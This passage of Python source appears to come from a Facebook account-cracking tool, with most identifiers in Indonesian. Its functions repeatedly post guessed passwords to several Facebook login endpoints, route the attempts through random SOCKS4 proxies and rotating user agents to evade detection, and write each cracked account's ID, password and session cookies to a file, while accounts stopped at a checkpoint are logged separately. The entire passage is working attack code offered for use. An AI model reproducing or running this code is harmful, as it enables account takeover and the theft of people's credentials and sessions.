			hulu = {"Host": "x.facebook.com", "content-length": "10", "x-fb-lsd": '<re.Match object; span=(10302, 10332), match=''name="lsd" value="AVo4FeaGu1Y"''>', "user-agent": ua, "content-type": "application/x-www-form-urlencoded", "accept": "*/*", "origin": "https://x.facebook.com", "x-requested-with": "com.mi.globalbrowser.mini", "sec-fetch-site": "same-origin", "sec-fetch-mode": "cors", "sec-fetch-dest": "empty", "referer": "https://x.facebook.com/login/?app_id=1217981644879628&api_key=1217981644879628&next=https%3A%2F%2Fx.facebook.com%2Ffxauth%2F%3Fapp_id%3D1217981644879628%26etoken%3DAbj6LvpDiwWsf6eJTIX2e02oaKQTl9Bf5mT1GkrnTm5DiILMWyzRpW16pYFZQ00CVAwS2cJzWJ6AVCQ_3EMsW6Z2f3Rj2AJB-Pdqp9EhLCkgZxqDxr9vlkVQ%26extra_data%3D%252Fadd%252F%253Fbackground_page%253D%25252Fconnected_experiences%25252Fcross_posting%25252F%26native_app_login_flow%3Dfbcalcomettest&skip_api_login=1&no_next_msg&hide_upsell=1&hide_language_selector=0&hide_registration=0&src=fxcal&show_accounts_center_content=1&refsrc=deprecated&_rdr", "accept-encoding": "gzip, deflate", "accept-language": "en-US;q=0.8,en;q=0.7"}
			tamsis.post("https://x.facebook.com/login/device-based/login/async/?api_key=1217981644879628&auth_token=b4c978c6cc29df1e66058283d8bcbabe&skip_api_login=1&next=https%3A%2F%2Fx.facebook.com%2Ffxauth%2F%3Fapp_id%3D1217981644879628%26etoken%3DAbj6LvpDiwWsf6eJTIX2e02oaKQTl9Bf5mT1GkrnTm5DiILMWyzRpW16pYFZQ00CVAwS2cJzWJ6AVCQ_3EMsW6Z2f3Rj2AJB-Pdqp9EhLCkgZxqDxr9vlkVQ%26extra_data%3D%252Fadd%252F%253Fbackground_page%253D%25252Fconnected_experiences%25252Fcross_posting%25252F%26native_app_login_flow%3Dfbcalcomettest&refsrc=deprecated&app_id=1217981644879628&lwv=100",data=data,allow_redirects=False,headers=hulu,proxies=proxs)
			login=tamsis.cookies.get_dict().keys()
			if 'c_user' in login:
				ok+=1
				kuki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				print('\n')
				cetak(pnl(f"""
[green]\nID : {idi}
PASSWORD : {pw}
COOKIE : {kuki}
User-Agent : {ua}[white]
""",width=90,padding=(0,1),title=f"Tamsis-OK",style=f"bold white"))
				open('tamsis'+svo,'a').write('++++++++++++++++++++++++++++++++++++\nID :'+idi+'\nPassword : '+pw+'\nCookie : '+kuki+'\n++++++++++++++++++++++++++++++++++++\n')
				break
			elif 'checkpoint' in login:
				cp+=1
				print('\n')
				cetak(pnl(f"""[yellow]
ID : {idi}
Password : {pw}
User-Agent : {ua}[white]
""",width=90,padding=(0,1),title=f"Tamsis-CP",style=f"bold white"))
				open('tamsis'+svc,'a').write(idi+'|'+pw+'\n')
				break
			else:
				continue
		except requests.exceptions.ConnectionError:bobo(31)
	loop+=1
def metode2(idi,sandi):
	global cp,ok,loop
	print(f'\r#Free-async# {loop}/{len(id)} [{idi}]  CP : {cp} OK :{ok} ',end='  ')
	sys.stdout.flush()
	ua = random.choice(uaa)
	tamsis=requests.Session()
	for pw in sandi:
		try:
			prk=random.choice(bro)
			proxs= {'http': 'socks4://'+prk}
			tamsis.headers.update({"Host": "free.facebook.com", "upgrade-insecure-requests": "1", "user-agent": ua, "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "x-requested-with": "com.mi.globalbrowser.mini", "sec-fetch-site":  "none", "sec-fetch-mode": "navigate", "sec-fetch-user": "?1", "sec-fetch-dest": "document", "accept-encoding": "gzip, deflate", "accept-language":  "en-US;q=0.8,en;q=0.7"})
			kode = tamsis.get(f"https://free.facebook.com/login.php?skip_api_login=1&api_key=322935469656730&kid_directed_site=0&app_id=322935469656730&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fdialog%2Foauth%3Fclient_id%3D322935469656730%26redirect_uri%3Dhttps%253A%252F%252Fauth.meta.com%252Flogin%252Ffacebook%252Fresponse%252F%253Fstate%253DATD5nHC4edOMoAzC8J17lYNyHSaLUR2HV5zxWLj0OjpodHV6r6u1_gCAISpijfm0EFoQUtn16BBW8Ah2aCj5H-X0CqVofDKDRqent4fe7YA50B-ui6Mq7kTGmIp_j1U5triydjrynmOXjAhTHJR5SSfBL30-ua5TBgcJtlRgULcIHPOohSl0sQUgpvsMzAUZbSzoholY9NsYWIckn9Bq_3qfn4mtCqfPBIMJqzmPv7Qv0WacvuLDiJMhce4-3JjE8FE9m3H-nKlFSSDGVyhCTxUN0PCgiCIq1yyJhuKqlNx4aUb2kKZuPrMm4545MVT2e580DRuJYeeGuR8RqxrJ8XgtPViKGnd7XFO48NO6XhIivpaogF9BpRvn1FzNZMnVCSBZ0qI4aquNupeiwZ0ItZFVhSf2KqKkHInuvpCJ4PwZtbnRPR9jk3ZnFFb3M9puqmB47R1RaWz2y-icx8T0kiwGk-SEMtU9T3wWoxa2BbobbQL3GBt09IW2oQRiLHcb7LiYxFQoiiiroczxA4WwFrXsS2D0Hl_ZrpB5aLA-rgW080lvxV8iEYO61gj1xTMpqXF5zKz9VjE_qL0TQzK5bgaMJpywnt8TMFte0GU5C-nnDrtJQrMsVH6vMGHi0zqbtT51Cotl9FIfm9GE3Czegn7Hmrms0uDqxnFpQc0CuDs%26response_type%3Dcode%26scope%3Dpublic_profile%252Cemail%252Cuser_birthday%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D74e8cf7e-d665-4088-9570-0eb586cc4ed4%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fauth.meta.com%2Flogin%2Ffacebook%2Fresponse%2F%3Fstate%3DATD5nHC4edOMoAzC8J17lYNyHSaLUR2HV5zxWLj0OjpodHV6r6u1_gCAISpijfm0EFoQUtn16BBW8Ah2aCj5H-X0CqVofDKDRqent4fe7YA50B-ui6Mq7kTGmIp_j1U5triydjrynmOXjAhTHJR5SSfBL30-ua5TBgcJtlRgULcIHPOohSl0sQUgpvsMzAUZbSzoholY9NsYWIckn9Bq_3qfn4mtCqfPBIMJqzmPv7Qv0WacvuLDiJMhce4-3JjE8FE9m3H-nKlFSSDGVyhCTxUN0PCgiCIq1yyJhuKqlNx4aUb2kKZuPrMm4545MVT2e580DRuJYeeGuR8RqxrJ8XgtPViKGnd7XFO48NO6XhIivpaogF9BpRvn1FzNZMnVCSBZ0qI4aquNupeiwZ0ItZFVhSf2KqKkHInuvpCJ4PwZtbnRPR9jk3ZnFFb3M9puqmB47R1RaWz2y-icx8T0kiwGk-SEMtU9T3wWoxa2BbobbQL3GBt09IW2oQRiLHcb7LiYxFQoiiiroczxA4WwFrXsS2D0Hl_ZrpB5aLA-rgW080lvxV8iEYO61gj1xTMpqXF5zKz9VjE_qL0TQzK5bgaMJpywnt8TMFte0GU5C-nnDrtJQrMsVH6vMGHi0zqbtT51Cotl9FIfm9GE3Czegn7Hmrms0uDqxnFpQc0CuDs%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr").text
			data = {'lsd': re.search('name="lsd" value="(.*?)"',str(kode)).group(1), 'jazoest': re.search('name="jazoest" value="(.*?)"',str(kode)).group(1), 'm_ts': re.search('name="m_ts" value="(.*?)"',str(kode)).group(1), 'li': re.search('name="li" value="(.*?)"',str(kode)).group(1), 'email': idi, 'pass': pw,'bi_xrwh': re.search('name="bi_xrwh" value="(.*?)"',str(kode)).group(1)}
			hulu = {"Host": "free.facebook.com", "content-length": "10", "x-fb-lsd": '<re.Match object; span=(10302, 10332), match=''name="lsd" value="AVo4FeaGu1Y"''>', "user-agent": ua, "content-type": "application/x-www-form-urlencoded", "accept": "*/*", "origin": "https://free.facebook.com", "x-requested-with": "com.mi.globalbrowser.mini", "sec-fetch-site": "same-origin", "sec-fetch-mode": "cors", "sec-fetch-dest": "empty", "referer": "https://free.facebook.com/login/?app_id=1217981644879628&api_key=1217981644879628&next=https%3A%2F%2Fm.facebook.com%2Ffxauth%2F%3Fapp_id%3D1217981644879628%26etoken%3DAbj6LvpDiwWsf6eJTIX2e02oaKQTl9Bf5mT1GkrnTm5DiILMWyzRpW16pYFZQ00CVAwS2cJzWJ6AVCQ_3EMsW6Z2f3Rj2AJB-Pdqp9EhLCkgZxqDxr9vlkVQ%26extra_data%3D%252Fadd%252F%253Fbackground_page%253D%25252Fconnected_experiences%25252Fcross_posting%25252F%26native_app_login_flow%3Dfbcalcomettest&skip_api_login=1&no_next_msg&hide_upsell=1&hide_language_selector=0&hide_registration=0&src=fxcal&show_accounts_center_content=1&refsrc=deprecated&_rdr", "accept-encoding": "gzip, deflate", "accept-language": "en-US;q=0.8,en;q=0.7"}
			tamsis.post("https://free.facebook.com/login/device-based/login/async/?api_key=1217981644879628&auth_token=b4c978c6cc29df1e66058283d8bcbabe&skip_api_login=1&next=https%3A%2F%2Ffree.facebook.com%2Ffxauth%2F%3Fapp_id%3D1217981644879628%26etoken%3DAbj6LvpDiwWsf6eJTIX2e02oaKQTl9Bf5mT1GkrnTm5DiILMWyzRpW16pYFZQ00CVAwS2cJzWJ6AVCQ_3EMsW6Z2f3Rj2AJB-Pdqp9EhLCkgZxqDxr9vlkVQ%26extra_data%3D%252Fadd%252F%253Fbackground_page%253D%25252Fconnected_experiences%25252Fcross_posting%25252F%26native_app_login_flow%3Dfbcalcomettest&refsrc=deprecated&app_id=1217981644879628&lwv=100",data=data,allow_redirects=False,headers=hulu,proxies=proxs)
			login=tamsis.cookies.get_dict().keys()
			if 'c_user' in login:
				ok+=1
				kuki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				print('\n')
				cetak(pnl(f"""
[green]\nID : {idi}
PASSWORD : {pw}
COOKIE : {kuki}
User-Agent : {ua}[white]
""",width=90,padding=(0,1),title=f"Tamsis-OK",style=f"bold white"))
				open('tamsis'+svo,'a').write('++++++++++++++++++++++++++++++++++++\nID :'+idi+'\nPassword : '+pw+'\nCookie : '+kuki+'\n++++++++++++++++++++++++++++++++++++\n')
				break
			elif 'checkpoint' in login:
				cp+=1
				print('\n')
				cetak(pnl(f"""[yellow]
ID : {idi}
Password : {pw}
User-Agent : {ua}[white]
""",width=90,padding=(0,1),title=f"Tamsis-CP",style=f"bold white"))
				open('tamsis'+svc,'a').write(idi+'|'+pw+'\n')
				break
			else:
				continue
		except requests.exceptions.ConnectionError:bobo(31)
	loop+=1
def metode11(idi,sandi):
	global cp,ok,loop
	print(f'\r#Feee-regular# {loop}/{len(id)} [{idi}]  CP : {cp} OK :{ok} ',end='  ')
	sys.stdout.flush()
	ua = random.choice(uaa)
	tamsis=requests.Session()
	for pw in sandi:
		try:
			prk=random.choice(bro)
			proxs= {'http': 'socks4://'+prk}
			hulu={'Host': 'free.facebook.com','content-length': '169','cache-control': 'max-age=0','viewport-width': '980','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': 'Android','sec-ch-ua-platform-version': '9.0.0','sec-ch-prefers-color-scheme': 'light','upgrade-insecure-requests': '1','origin': 'https://free.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36','accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','sec-fetch-site': 'same-origin','sec-fetch-mode': 'navigate','sec-fetch-user': '?1','sec-fetch-dest': 'document','referer': 'https://free.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
			kode=tamsis.get('https://free.facebook.com/login/device-based/regular/login/').text
			data={'lsd':re.search('name="lsd" value="(.*?)"', str(kode)).group(1),'jazoest':re.search('name="jazoest" value="(.*?)"', str(kode)).group(1),'m_ts':re.search('name="m_ts" value="(.*?)"', str(kode)).group(1),'li':re.search('name="li" value="(.*?)"', str(kode)).group(1),'email':idi,'pass':pw}
			tamsis.post('https://free.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100&ref=dbl',data=data,allow_redirects=False,headers=hulu,proxies=proxs)
			login=tamsis.cookies.get_dict().keys()
			if 'c_user' in login:
				ok+=1
				kuki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				print('\n')
				cetak(pnl(f"""
[green]\nID : {idi}
PASSWORD : {pw}
COOKIE : {kuki}
User-Agent : {ua}[white]
""",width=90,padding=(0,1),title=f"Tamsis-OK",style=f"bold white"))
				open('tamsis'+svo,'a').write('++++++++++++++++++++++++++++++++++++\nID :'+idi+'\nPassword : '+pw+'\nCookie : '+kuki+'\n++++++++++++++++++++++++++++++++++++\n')
				break
			elif 'checkpoint' in login:
				cp+=1
				print('\n')
				cetak(pnl(f"""[yellow]
ID : {idi}
Password : {pw}
User-Agent : {ua}[white]
""",width=90,padding=(0,1),title=f"Tamsis-CP",style=f"bold white"))
				open('tamsis'+svc,'a').write(idi+'|'+pw+'\n')
				break
			else:
				continue
		except requests.exceptions.ConnectionError:bobo(31)
	loop+=1
def metode7(idi,sandi):
	global cp,ok,loop
	print(f'\r#Stable-async# {loop}/{len(id)} [{idi}]  CP : {cp} OK :{ok} ',end='  ')
	sys.stdout.flush()
	ua = random.choice(uaa)
	tamsis = requests.Session()			
	for pw in sandi:
		try:
			prk=random.choice(bro)
			proxs= {'http': 'socks4://'+prk}
			hulu = {
"Host": "m.trunkstable.facebook.com",
"content-length": "2158",
"sec-ch-ua-mobile": "?1",
"user-agent": ua,
"viewport-width": "400",
"content-type": "application/x-www-form-urlencoded",
"x-fb-lsd": "AVr-dDflkjw",
"sec-ch-ua-platform-version": "9.0.0",
"x-asbd-id": "198387",
"sec-ch-prefers-color-scheme": "light",
"sec-ch-ua-platform": "Android",
"accept": "*/*",
"origin": "https://m.trunkstable.facebook.com",
"sec-fetch-site": "same-origin",
"sec-fetch-mode": "cors",
"sec-fetch-dest": "empty",
"referer": "https://m.trunkstable.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8",
"accept-encoding": "gzip, deflate, br",
"accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
			kode=tamsis.get('https://m.trunkstable.facebook.com/login/device-based/login/async').text
			data={'lsd':re.search('name="lsd" value="(.*?)"', str(kode)).group(1),'jazoest':re.search('name="jazoest" value="(.*?)"', str(kode)).group(1),'m_ts':re.search('name="m_ts" value="(.*?)"', str(kode)).group(1),'li':re.search('name="li" value="(.*?)"', str(kode)).group(1),'email':idi,'pass':pw}
			tamsis.post('https://m.trunkstable.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=data,allow_redirects=False,headers=hulu,proxies=proxs)
			login=tamsis.cookies.get_dict().keys()
			if 'c_user' in login:
				ok+=1
				kuki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				print('\n')
				cetak(pnl(f"""
[green]\nID : {idi}
PASSWORD : {pw}
COOKIE : {kuki}
User-Agent : {ua}[white]
""",width=90,padding=(0,1),title=f"Tamsis-OK",style=f"bold white"))
				open('tamsis'+svo,'a').write('++++++++++++++++++++++++++++++++++++\nID :'+idi+'\nPassword : '+pw+'\nCookie : '+kuki+'\n++++++++++++++++++++++++++++++++++++\n')
				break
			elif 'checkpoint' in login:
				cp+=1
				print('\n')
				cetak(pnl(f"""[yellow]
ID : {idi}
Password : {pw}
User-Agent : {ua}[white]
""",width=90,padding=(0,1),title=f"Tamsis-CP",style=f"bold white"))
				open('tamsis'+svc,'a').write(idi+'|'+pw+'\n')
				break
			else:
				continue
		except requests.exceptions.ConnectionError:bobo(31)
	loop+=1
def metode8(idi,sandi):
	global cp,ok,loop
	print(f'\r#Alpha-async# {loop}/{len(id)} [{idi}]  CP : {cp} OK :{ok} ',end='  ')
	sys.stdout.flush()
	ua = random.choice(uaa)
	tamsis = requests.Session()			
	for pw in sandi:
		try:
			prk=random.choice(bro)
			proxs= {'http': 'socks4://'+prk}
			sys.stdout.flush()
			kode = tamsis.get('https://x.alpha.facebook.com').text
			data = {"lsd":re.search('name="lsd" value="(.*?)"', str(kode)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(kode)).group(1),"m_ts":re.search('name="m_ts" value="(.*?)"', str(kode)).group(1),"li":re.search('name="li" value="(.*?)"', str(kode)).group(1),"try_number":"0","unrecognized_tries":"0","email":idi,"pass":pw,"login":"Log In"}
			hulu = {'Host': 'x.alpha.facebook.com','content-length': '2162','x-fb-lsd': 'AVoImhtP_ms','content-type': 'application/x-www-form-urlencoded','x-asbd-id': '198387','sec-ch-ua-mobile': '?1','user-agent': ua,'sec-ch-ua-platform': 'Android','accept': '*/*','origin': 'https://x.alpha.facebook.com','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://x.alpha.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
			tamsis.post('https://x.alpha.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=data,allow_redirects=False,headers=hulu,proxies=proxs)
			login=tamsis.cookies.get_dict().keys()
			if 'c_user' in login:
				ok+=1
				kuki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				print('\n')
				cetak(pnl(f"""
[green]ID : {idi}
PASSWORD : {pw}
COOKIE : {kuki}
User-Agent : {ua}[white]
""",width=90,padding=(0,1),title=f"Tamsis-OK",style=f"bold white"))
				open('tamsis'+svo,'a').write('++++++++++++++++++++++++++++++++++++\nID :'+idi+'\nPassword : '+pw+'\nCookie : '+kuki+'\n++++++++++++++++++++++++++++++++++++\n')
				break
			elif 'checkpoint' in login:
				cp+=1
				print('\n')
				cetak(pnl(f"""[yellow]
ID : {idi}
Password : {pw}
User-Agent : {ua}[white]
""",width=90,padding=(0,1),title=f"Tamsis-CP",style=f"bold white"))
				open('tamsis'+svc,'a').write(idi+'|'+pw+'\n')
				break
			else:
				continue
		except requests.exceptions.ConnectionError:bobo(31)
	loop+=1
def metode1(idi,sandi):
	global cp,ok,loop
	print(f'\r#Mbasic-async# {loop}/{len(id)} [{idi}]  CP : {cp} OK :{ok} ',end='  ')
	sys.stdout.flush()
	ua = random.choice(uaa)
	tamsis = requests.Session()			
	for pw in sandi:
		try:
			prk=random.choice(bro)
			proxs= {'http': 'socks4://'+prk}
			mbasic_fb = tamsis.get('https://mbasic.facebook.com').text
			data = {"lsd":re.search('name="lsd" value="(.*?)"', str(mbasic_fb)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(mbasic_fb)).group(1),"m_ts":re.search('name="m_ts" value="(.*?)"', str(mbasic_fb)).group(1),"li":re.search('name="li" value="(.*?)"', str(mbasic_fb)).group(1),"try_number":"0","unrecognized_tries":"0","email":idi,"pass":pw,"login":"Log In"}
			hulu = {"authority": 'mbasic.facebook.com',"method": 'GET',"scheme": 'https','accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','accept-language': 'en-GB,en-US;q=0.9,en;q=0.8','cache-control': 'max-age=0','sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','sec-fetch-dest': 'document','sec-fetch-mode': 'navigate','sec-fetch-site': 'none','sec-fetch-user': '?1','upgrade-insecure-requests': '1','user-agent': ua}
			tamsis.post('https://mbasic.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=data,allow_redirects=False,headers=hulu,proxies=proxs)
			login=tamsis.cookies.get_dict().keys()
			if 'c_user' in login:
				kuki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				print('\n')
				cetak(pnl(f"""
[green]ID : {idi}
PASSWORD : {pw}
COOKIE : {kuki}
User-Agent : {ua}[white]
""",width=90,padding=(0,1),title=f"Tamsis-OK",style=f"bold white"))
				open('tamsis'+svo,'a').write('++++++++++++++++++++++++++++++++++++\nID :'+idi+'\nPassword : '+pw+'\nCookie : '+kuki+'\n++++++++++++++++++++++++++++++++++++\n')
				ok+=1
				break
			elif 'checkpoint' in login:
				cp+=1
				print('\n')
				cetak(pnl(f"""[yellow]
ID : {idi}
Password : {pw}
User-Agent : {ua}[white]
""",width=90,padding=(0,1),title=f"Tamsis-CP",style=f"bold white"))
				open('tamsis'+svc,'a').write(idi+'|'+pw+'\n')
				break
			else:
				continue
		except requests.exceptions.ConnectionError:bobo(31)
	loop+=1
def metode9(idi,sandi):
	global cp,ok,loop
	print(f'\r#Latest-async# {loop}/{len(id)} [{idi}]  CP : {cp} OK :{ok} ',end='  ')
	sys.stdout.flush()
	ua = random.choice(uaa)
	tamsis = requests.Session()			
	for pw in sandi:
		try:
			prk=random.choice(bro)
			proxs= {'http': 'socks4://'+prk}
			hulu = {"Host": "m.latest.facebook.com","content-length": "2142","x-fb-lsd": "AVr2PTWFBX0","sec-ch-ua": "'Not:A-Brand';v='99', 'Chromium';v='112'","content-type": "application/x-www-form-urlencoded","x-asbd-id": "198387","sec-ch-ua-mobile": "?0","user-agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36","sec-ch-ua-platform": "Linux","accept": "*/*","origin": "https://m.latest.facebook.com","sec-fetch-site": "same-origin","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://m.latest.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8","accept-encoding": "gzip, deflate, br","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
			kode=tamsis.get('https://m.latest.facebook.com/login/device-based/login/async').text
			data={'lsd':re.search('name="lsd" value="(.*?)"', str(kode)).group(1),'jazoest':re.search('name="jazoest" value="(.*?)"', str(kode)).group(1),'m_ts':re.search('name="m_ts" value="(.*?)"', str(kode)).group(1),'li':re.search('name="li" value="(.*?)"', str(kode)).group(1),'email':idi,'pass':pw}
			tamsis.post('https://m.latest.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=data,allow_redirects=False,headers=hulu,proxies=proxs)
			login=tamsis.cookies.get_dict().keys()
			if 'c_user' in login:
				ok+=1
				kuki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				print('\n')
				cetak(pnl(f"""
[green]ID : {idi}
PASSWORD : {pw}
COOKIE : {kuki}
User-Agent : {ua}[white]
""",width=90,padding=(0,1),title=f"Tamsis-OK",style=f"bold white"))
				open('tamsis'+svo,'a').write('++++++++++++++++++++++++++++++++++++\nID :'+idi+'\nPassword : '+pw+'\nCookie : '+kuki+'\n++++++++++++++++++++++++++++++++++++\n')
				break
			elif 'checkpoint' in login:
				cp+=1
				print('\n')
				cetak(pnl(f"""[yellow]
ID : {idi}
Password : {pw}
User-Agent : {ua}[white]
""",width=90,padding=(0,1),title=f"Tamsis-CP",style=f"bold white"))
				open('tamsis'+svc,'a').write(idi+'|'+pw+'\n')
				break
			else:
				continue
		except requests.exceptions.ConnectionError:bobo(31)
	loop+=1
def metode13(idi,sandi):
	global cp,ok,loop
	print(f'\r#Latest-validate# {loop}/{len(id)} [{idi}]  CP : {cp} OK :{ok} ',end='  ')
	sys.stdout.flush()
	ua = random.choice(uaa)
	tamsis = requests.Session()			
	for pw in sandi:
		try:
			
			prk=random.choice(bro)
			proxs= {'http': 'socks4://'+prk}
			hulu={'Host': 'm.latest.facebook.com','content-length': '269','cache-control': 'max-age=0','viewport-width': '980','sec-ch-ua': '"Chromium";v="112", "Google Chrome";v="112", "Not:A-Brand";v="99"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','sec-ch-ua-platform-version': '"9.0.0"','sec-ch-ua-full-version-list': '"Chromium";v="112.0.5615.48", "Google Chrome";v="112.0.5615.48", "Not:A-Brand";v="99.0.0.0"','sec-ch-prefers-color-scheme': 'light','upgrade-insecure-requests': '1','origin': 'https://m.latest.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36','accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','sec-fetch-site': 'same-origin','sec-fetch-mode': 'navigate','sec-fetch-user': '?1','sec-fetch-dest': 'document','referer': 'https://m.latest.facebook.com/login/device-based/password/?uid='+idi+'&flow=login_no_pin&wtsid=rdr_0ooccGnxILDYokYZB&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
			kode=tamsis.get('https://m.latest.facebook.com/login/device-based/validate-password/?uid='+idi).text
			data={'lsd':re.search('name="lsd" value="(.*?)"', str(kode)).group(1),'jazoest':re.search('name="jazoest" value="(.*?)"', str(kode)).group(1),'m_ts':re.search('name="m_ts" value="(.*?)"', str(kode)).group(1),'li':re.search('name="li" value="(.*?)"', str(kode)).group(1),'email':idi,'pass':pw}
			tamsis.post('https://m.latest.facebook.com/login/device-based/validate-password/?shbl=0',data=data,allow_redirects=False,headers=hulu,proxies=proxs)
			login=tamsis.cookies.get_dict().keys()
			if 'c_user' in login:
				ok+=1
				kuki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				print('\n')
				cetak(pnl(f"""
[green]ID : {idi}
PASSWORD : {pw}
COOKIE : {kuki}
User-Agent : {ua}[white]
""",width=90,padding=(0,1),title=f"Tamsis-OK",style=f"bold white"))
				open('tamsis'+svo,'a').write('++++++++++++++++++++++++++++++++++++\nID :'+idi+'\nPassword : '+pw+'\nCookie : '+kuki+'\n++++++++++++++++++++++++++++++++++++\n')
				break
			elif 'checkpoint' in login:
				cp+=1
				print('\n')
				cetak(pnl(f"""[yellow]
ID : {idi}
Password : {pw}
User-Agent : {ua}[white]
""",width=90,padding=(0,1),title=f"Tamsis-CP",style=f"bold white"))
				open('tamsis'+svc,'a').write(idi+'|'+pw+'\n')
				break
			else:
				continue
		except requests.exceptions.ConnectionError:bobo(31)
	loop+=1
def metode4(idi,sandi):
	global cp,ok,loop
	print(f'\r#Mbasic-validate# {loop}/{len(id)} [{idi}]  CP : {cp} OK :{ok} ',end='  ')
	sys.stdout.flush()
	ua = random.choice(uaa)
	tamsis = requests.Session()			
	for pw in sandi:
		try:
			
			prk=random.choice(bro)
			proxs= {'http': 'socks4://'+prk}
			kode = tamsis.get('https://mbasic.facebook.com/login.php?skip_api_login=1&api_key=141595129234543&kid_directed_site=0&app_id=141595129234543&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv5.0%2Fdialog%2Foauth%3Fclient_id%3D141595129234543%26redirect_uri%3Dhttps%253A%252F%252Fibispaint.com%252Flogin.jsp%26display%3Dpopup%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3De8184574-7e8f-41f3-b6d5-47a6c13f68fd%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fibispaint.com%2Flogin.jsp%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr').text
			tamsis.headers.update({'Host': 'mbasic.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(kode)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(kode)).group(1),"uid":idi,"next":"https://developers.facebook.com/tools/debug/accesstoken/","flow":"login_no_pin","pass":pw}
			hulu={'Host': 'mbasic.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://m.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
			tamsis.post('https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,headers=hulu,proxies=proxs)
			login=tamsis.cookies.get_dict().keys()
			if 'c_user' in login:
				ok+=1
				kuki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				print('\n')
				cetak(pnl(f"""
[green]ID : {idi}
PASSWORD : {pw}
COOKIE : {kuki}
User-Agent : {ua}[white]
""",width=90,padding=(0,1),title=f"Tamsis-OK",style=f"bold white"))
